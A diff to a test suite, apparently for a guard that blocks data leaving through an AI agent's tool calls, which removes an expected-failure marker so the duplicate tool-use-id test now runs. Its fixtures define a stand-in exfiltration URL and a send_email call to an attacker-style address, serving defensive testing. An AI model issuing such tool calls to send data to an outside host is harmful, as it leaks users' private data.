@@ -35,10 +35,6 @@ EVIL = "https://collector.evil-demo.net/upload"
 DR_LEE = "dr.lee@demo.sentinel.local"
 
 
-def gap(cause):
-    return pytest.mark.xfail(strict=True, reason=f"{cause} not fixed yet")
-
-
 KNOWN_LIMIT = pytest.mark.xfail(strict=True, reason="known limit: the brief's egress table allows block-listed data "
                                                     "to an allow-listed host")
 
@@ -535,7 +531,6 @@ def test_a_nested_tool_call_fails_closed(presidio, container):
     assert ports.events[-1].headline is Action.BLOCK
 
 
-@gap("R6")
 def test_duplicate_tool_use_ids_fail_closed(presidio):
     reply = model_reply(
         tool_use("send_email", "toolu_dup", to="x@collector.evil-demo.net", subject="r",
